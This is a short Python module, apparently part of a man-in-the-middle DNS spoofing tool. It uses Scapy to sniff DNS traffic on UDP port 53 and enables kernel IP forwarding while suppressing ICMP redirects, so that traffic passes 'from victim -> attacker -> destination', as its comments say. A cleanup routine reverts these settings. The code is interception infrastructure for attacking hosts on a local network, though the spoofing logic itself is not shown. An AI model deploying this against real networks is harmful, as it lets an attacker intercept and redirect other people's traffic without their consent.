from scapy.all import *
import subprocess


def intercept_pkts(self_mac, interface, lfilter, callback):
	sniff(
		iface=interface, 
		store=False,
		prn=lambda pkt: callback(pkt, interface),
		filter=f"udp and port 53", # intercept only udp packets on port 53
		lfilter=lambda pkt: lfilter(pkt, self_mac)
	)
		
	
def run(cmd):
	subprocess.run(cmd, shell=True, check=True)

# Enables kernel forwarding, which allows for fast forwarding from victim -> attacker -> destination
def enable_kernel_forwarding(interface):
	# Enable IP forwarding
	# This rewrites L2 headers without touching anything else
	run("sysctl -w net.ipv4.ip_forward=1")
    
	# Prevent ICMP redirects from showing
	run("sysctl -w net.ipv4.conf.all.send_redirects=0")
	run(f"sysctl -w net.ipv4.conf.{interface}.send_redirects=0")

# Revert the changes made in enable_kernel_forwarding
def cleanup_forward(interface):
	run("sysctl -w net.ipv4.ip_forward=0")
	run("sysctl -w net.ipv4.conf.all.send_redirects=1")
	run(f"sysctl -w net.ipv4.conf.{interface}.send_redirects=1")
